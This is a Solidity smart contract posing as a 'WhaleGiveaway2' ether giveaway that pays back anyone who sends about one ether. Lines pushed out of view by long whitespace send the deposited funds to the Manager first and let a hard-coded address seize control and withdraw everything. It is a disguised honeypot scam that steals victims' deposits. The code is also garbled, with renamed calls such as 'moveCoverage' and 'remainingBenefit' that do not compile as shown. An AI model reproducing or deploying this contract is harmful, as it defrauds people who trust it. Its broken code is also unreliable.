// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Manager = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function redeem()
    public
    payable
    {
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Manager.moveCoverage(this.remainingBenefit);
            msg.sender.moveCoverage(this.remainingBenefit);
        }
    }

    function accessBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Manager=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Manager);
        Manager.moveCoverage(this.remainingBenefit);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Manager);
        adr.call.value(msg.value)(data);
    }
}